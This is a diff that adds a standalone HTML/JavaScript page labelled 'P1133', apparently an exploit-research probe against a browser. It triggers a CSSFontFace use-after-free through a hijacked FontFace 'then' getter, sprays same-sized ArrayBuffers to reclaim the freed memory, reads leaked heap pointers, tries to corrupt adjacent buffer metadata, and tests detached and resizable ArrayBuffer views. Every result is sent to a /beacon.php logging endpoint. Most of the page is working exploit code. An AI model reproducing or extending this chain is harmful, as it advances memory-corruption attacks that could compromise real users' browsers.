@@ -1,0 +1,216 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1133</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1133: RAB LENGTH CORRUPTION VIA UAF ===');
+log('info','Use CSSFontFace UAF to corrupt adjacent ArrayBuffer metadata');
+B('P1133-START','t='+Date.now());
+
+var R=[];
+
+// ===== STEP 1: Test ArrayBuffer backing store adjacency =====
+// Allocate many ArrayBuffers of SAME size and check if they get adjacent backing stores
+// By writing a pattern to each and checking for overlap/adjacency
+log('info','Step 1: Backing store adjacency test...');
+
+try{
+  var SIZE=192; // Match CSSFontFace size
+  var N=500;
+  var bufs=[];
+
+  for(var i=0;i<N;i++){
+    var ab=new ArrayBuffer(SIZE);
+    var v=new BigUint64Array(ab);
+    // Write a unique pattern
+    v[0]=BigInt(i)|BigInt(0xAA000000)<<32n;
+    bufs.push({ab:ab,view:v,idx:i});
+  }
+
+  // Now check: does writing past the end of one buffer affect the next?
+  // (This tests for adjacent allocations WITHOUT actual OOB write)
+  // We can't write past the end from JS, but we can check if two buffers
+  // share a page by comparing their BigUint64Array address-like differences
+
+  // Strategy: Use the CSSFontFace UAF window to read memory BETWEEN buffers
+  // If two buffers are adjacent, the UAF window placed between them
+  // would see both patterns
+
+  R.push('BUFS_CREATED='+bufs.length);
+  log('ok','Created '+N+' ArrayBuffers of '+SIZE+' bytes');
+}catch(e){R.push('BUFS=EXCEPT|'+e.message);}
+
+// ===== STEP 2: Trigger UAF and check what we find =====
+log('info','Step 2: UAF trigger with targeted spray...');
+
+var r=Date.now()%10000;
+var hit=false,uafMap=null;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(hit)return undefined;hit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // CRITICAL: spray EXACTLY 192-byte buffers to reclaim the CSSFontFace slot
+  uafMap=[];
+  for(var i=0;i<100;i++){
+    uafMap.push(new ArrayBuffer(192));
+  }
+
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+// Scan for the CSSFontFace pattern
+var foundUAF=false;
+for(var t=5;t<=200;t+=2){(function(ms){setTimeout(function(){
+  if(foundUAF||!uafMap)return;
+  for(var bi=0;bi<uafMap.length;bi++){
+    var b=new BigUint64Array(uafMap[bi]);
+    // CSSFontFace: q0=1 (refcount), q11=HEAP, q13=HEAP
+    if(b[0]===1n&&b[11]!==0n&&b[13]!==0n){
+      var h11=Number(b[11]>>32n),h13=Number(b[13]>>32n);
+      if(h11>=0x10&&h11<=0xFF&&h13>=0x10&&h13<=0xFF){
+        // Verify: q1-q10 should be zero
+        var allZ=true;
+        for(var z=1;z<=10;z++)if(b[z]!==0n){allZ=false;break;}
+        if(!allZ||b[12]!==0n)continue;
+
+        foundUAF=true;
+        var q11=b[11],q13=b[13];
+        log('win','UAF HIT! bi='+bi+' q11='+hex64(q11)+' q13='+hex64(q13));
+        B('P1133-UAF','bi='+bi+'|ms='+ms+'|q11='+hex64(q11)+'|q13='+hex64(q13));
+
+        // Now use this window. We know:
+        // - This buffer's backing store ADDRESS = the freed CSSFontFace address
+        // - q11 and q13 are heap pointers to OTHER objects
+
+        // Write a MARKER pattern to this buffer
+        // If any of our pre-allocated bufs[] overlap or are adjacent,
+        // their pattern will show up
+        b[0]=BigInt('0xBBBBBBBBBBBBBBBB');
+        b[1]=BigInt('0xCCCCCCCCCCCCCCCC');
+
+        // Check ALL pre-allocated buffers for the marker
+        var overlapFound=false;
+        for(var ci=0;ci<bufs.length;ci++){
+          var cv=bufs[ci].view;
+          if(cv[0]===BigInt('0xBBBBBBBBBBBBBBBB')||cv[1]===BigInt('0xCCCCCCCCCCCCCCCC')){
+            overlapFound=true;
+            log('win','OVERLAP with buf['+ci+']!');
+            B('P1133-OVERLAP','ci='+ci+'|uaf_bi='+bi);
+            R.push('OVERLAP|ci='+ci+'|uaf_bi='+bi);
+          }
+        }
+
+        if(!overlapFound){
+          // No direct overlap. But we can use the UAF buffer to write
+          // arbitrary 192 bytes at the CSSFontFace address.
+          // The q11 pointer tells us WHERE in the heap we are.
+          // Can we calculate the offset to our bufs[] backing stores?
+
+          // Record the q11 address as our "known heap position"
+          R.push('NO_OVERLAP|q11='+hex64(q11)+'|q13='+hex64(q13));
+
+          // Write the original values back (don't corrupt CSSFontFace)
+          b[0]=1n;b[1]=0n;
+        }
+      }
+    }
+  }
+},ms);})(t);}
+
+// ===== STEP 3: Test structuredClone transfer for double-mapping =====
+// structuredClone with transfer can detach an ArrayBuffer
+// If the backing store is still in memory after transfer...
+log('info','Step 3: structuredClone transfer test...');
+
+setTimeout(function(){
+  try{
+    var origBuf=new ArrayBuffer(192);
+    var origView=new BigUint64Array(origBuf);
+    origView[0]=BigInt('0xDEADFACEDEADFACE');
+    origView[1]=BigInt('0x1234567812345678');
+
+    // Transfer (detach original, create new)
+    var cloned=structuredClone(origBuf,{transfer:[origBuf]});
+    var clonedView=new BigUint64Array(cloned);
+
+    // Original should be detached
+    var origDetached=origBuf.byteLength===0;
+
+    // Cloned should have the data
+    var clonedMatch=clonedView[0]===BigInt('0xDEADFACEDEADFACE');
+
+    // Can we still access the original view?
+    var origViewAccess='unknown';
+    try{
+      var val=origView[0];
+      origViewAccess='read_ok='+hex64(val);
+    }catch(e){origViewAccess='detached';}
+
+    R.push('SCLONE_TRANSFER|detached='+origDetached+'|match='+clonedMatch+'|orig_view='+origViewAccess);
+    B('P1133-SCLONE','det='+origDetached+'|match='+clonedMatch+'|orig='+origViewAccess);
+    log('info','Transfer: detached='+origDetached+' match='+clonedMatch+' orig='+origViewAccess);
+  }catch(e){R.push('SCLONE=EXCEPT|'+e.message);}
+},100);
+
+// ===== STEP 4: RAB resize + stale view test =====
+// Create RAB, get view, resize smaller, check if old view reads past new bounds
+setTimeout(function(){
+  try{
+    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+    var oldView=new BigUint64Array(rab);
+
+    // Fill with pattern
+    for(var i=0;i<oldView.length;i++)oldView[i]=BigInt(i)|BigInt(0xFF000000)<<32n;
+
+    // Resize smaller
+    rab.resize(256);
+
+    // Old view should respect new size
+    var newLen=oldView.length; // Should be 256/8=32
+    var canReadPast=false;
+    try{
+      // Try to read at old index (index 64 = byte 512, past new size 256)
+      var val=oldView[64];
+      if(val!==undefined&&val!==0n)canReadPast=true;
+      R.push('RAB_STALE|newLen='+newLen+'|read64='+hex64(val||0n)+'|past='+canReadPast);
+    }catch(e){R.push('RAB_STALE|newLen='+newLen+'|except='+e.message);}
+
+    // Resize back up
+    rab.resize(1024);
+    var restoredLen=oldView.length;
+
+    // Check if old data survives resize cycle
+    var dataAfterResize=oldView[64]; // Should be 0 or old value
+    R.push('RAB_RESTORE|restoredLen='+restoredLen+'|val64='+hex64(dataAfterResize));
+    B('P1133-RAB','newLen='+newLen+'|past='+canReadPast+'|restoredLen='+restoredLen+'|val64='+hex64(dataAfterResize));
+    log('info','RAB: newLen='+newLen+' past='+canReadPast+' restored='+restoredLen+' val64='+hex64(dataAfterResize));
+  }catch(e){R.push('RAB=EXCEPT|'+e.message);}
+},200);
+
+// ===== FINAL REPORT =====
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1133-DONE',R.join('|'));
+  log('phase','=== DONE: '+R.length+' results ===');
+  for(var i=0;i<R.length;i++){
+    B('P1133-R'+i,R[i]);
+    log('info','R'+i+': '+R[i]);
+  }
+},500);
+</script></body></html>
